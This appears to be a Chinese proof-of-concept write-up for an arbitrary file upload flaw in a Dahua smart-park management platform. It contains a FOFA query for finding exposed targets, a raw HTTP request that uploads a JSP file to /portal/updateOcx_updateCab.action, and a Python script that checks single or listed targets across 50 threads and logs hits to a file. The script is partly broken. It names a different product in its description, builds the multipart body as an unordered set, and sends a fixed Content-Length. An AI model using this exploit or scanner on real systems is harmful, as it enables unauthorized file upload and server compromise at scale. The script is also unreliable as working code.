### FOFA

```markdown
app="dahua-智慧园区综合管理平台"
```

### poc

```markdown
POST /portal/updateOcx_updateCab.action HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 429
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: http://www.baidu.com
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=9b1d729ed9954863bcbedbb523cec7fa

--9b1d729ed9954863bcbedbb523cec7fa
Content-Disposition: form-data; name="updateBean.loadCabFileName"

sAuyJk.jsp
--9b1d729ed9954863bcbedbb523cec7fa
Content-Disposition: form-data; name="updateBean.loadCab"; filename="sAuyJk.jsp"
Content-Type: text/plain

<% out.println(75471+90776+"tnMXedOsifiHeptP");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--9b1d729ed9954863bcbedbb523cec7fa--
```

文件地址  20240801102132 文件上传时间戳

```
http://xx.xx.xx.xx/portal/ocx/20240801102132/sAuyJk.jsp
```

### py脚本

```python
import argparse, requests, sys, re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义横幅
def banner():
    banner = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-19
                                                    version: 1.0.0
                                                    author: hulless-oat
"""
    print(banner)

# 定义主函数
def main():
    # 调用横幅
    banner()
    # argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="中城科信票务管理平台 任意文件上传")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input file path')
    args = parser.parse_args()
    # 如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    # 如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list = []
        with open(args.file, mode='r', encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n', ''))
                # print(url_list)
                # 设置多线程
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    # 如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

# 定义poc
def poc(target):
    payload = '/portal/updateOcx_updateCab.action'
    url = target + payload
    headers = {
        'Accept-Encoding': 'identity',
        'Content-Length': '429',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info',
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        'Connection': 'keep-alive',
        'Referer': 'http://www.baidu.com',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'multipart/form-data; boundary=9b1d729ed9954863bcbedbb523cec7fa'
    }
    data = {
        '--9b1d729ed9954863bcbedbb523cec7fa\r\n',
        'Content-Disposition: form-data; name="updateBean.loadCabFileName"\r\n',
        '\r\n'
        'sAuyJk.jsp\r\n',
        '--9b1d729ed9954863bcbedbb523cec7fa\r\n',
        'Content-Disposition: form-data; name="updateBean.loadCab"; filename="sAuyJk.jsp"\r\n',
        'Content-Type: text/plain\r\n',
        '\r\n'
        '<% out.println(75471+90776+"tnMXedOsifiHeptP");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n',
        '--9b1d729ed9954863bcbedbb523cec7fa--\r\n',
    }
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    # 请求网页
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, proxies=proxies, timeout=10)
        if res.status_code == 200:
            print(f'[+]{GREEN}该网站存在文件上传漏洞: {target}\n{RESET}')
            with open('result.txt', mode='a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            print(f'该网站不存在文件上传漏洞')
    except:
        print(f'该网站存在问题，请手动测试')


if __name__ == '__main__':
    main()
```

